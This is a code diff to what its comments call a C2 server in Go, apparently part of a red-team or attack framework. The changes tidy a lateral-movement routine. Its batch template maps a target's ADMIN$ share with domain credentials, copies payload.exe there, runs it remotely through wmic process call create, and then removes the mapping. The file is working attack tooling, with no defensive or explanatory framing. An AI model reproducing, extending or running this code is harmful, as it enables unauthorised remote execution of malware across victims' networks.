@@ -4,11 +4,8 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"log"
 	"net"
-	"os"
 	"os/exec"
-	"strings"
 	"sync"
 	"time"
 
@@ -97,9 +94,10 @@ func (m *Manager) executeSMB(ctx context.Context, targetIP, username, password, 
 	// For the C2 server, we coordinate and track
 	// The actual execution happens on the agent side
 
-	creds := fmt.Sprintf("%s\\%s:%s", domain, username, password)
+	// Build credentials string for logging
+	_ = fmt.Sprintf("%s\\%s:%s", domain, username, password)
 	if domain == "" {
-		creds = fmt.Sprintf("%s:%s", username, password)
+		_ = fmt.Sprintf("%s:%s", username, password)
 	}
 
 	// Use impacket-style approach or native Windows APIs via agent
@@ -411,7 +409,7 @@ if errorlevel 1 (
     echo Failed to connect
     exit /b 1
 )
-copy %TEMP%\payload.exe \\%s\ADMIN$\payload.exe
+copy %%TEMP%%\payload.exe \\%s\ADMIN$\payload.exe
 wmic /node:%s /user:%s\%s /password:%s process call create "C:\Windows\payload.exe"
 net use \\%s\ADMIN$ /delete
 `, targetIP, domain, username, password, targetIP, targetIP, domain, username, password, targetIP)
